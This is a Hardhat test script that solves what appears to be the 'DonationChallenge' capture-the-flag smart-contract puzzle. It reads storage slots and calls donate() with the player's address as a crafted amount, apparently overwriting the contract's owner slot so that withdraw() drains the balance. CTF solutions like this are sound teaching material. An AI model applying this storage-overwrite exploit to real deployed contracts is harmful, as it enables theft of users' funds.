import { expect } from "chai";
import { ethers } from "hardhat";

describe("DonationChallenge", function () {
  before(async () => {
    this.ctx.player = (await ethers.getSigners())[0];
    this.ctx.challengeContract = await ethers.getContractAt(
      "DonationChallenge",
      "0x969Aa9Dd431E8D741A800FBE42EcFb8559D0905E"
    );
  });
  it("exploit", async function () {
    const scale = ethers.BigNumber.from(10)
      .pow(18)
      .mul(ethers.constants.WeiPerEther);

    console.log(
      await ethers.provider.getStorageAt(this.challengeContract.address, 0)
    );
    console.log(
      await ethers.provider.getStorageAt(this.challengeContract.address, 1)
    );

    const amount = ethers.BigNumber.from(this.player.address);

    await this.challengeContract.donate(amount, { value: amount.div(scale) });
    console.log(
      await ethers.provider.getStorageAt(this.challengeContract.address, 0)
    );
    console.log(
      await ethers.provider.getStorageAt(this.challengeContract.address, 1)
    );
    await this.challengeContract.withdraw();
  });

  after(async () => {
    expect(await this.ctx.challengeContract.isComplete()).to.be.true;
  });
});
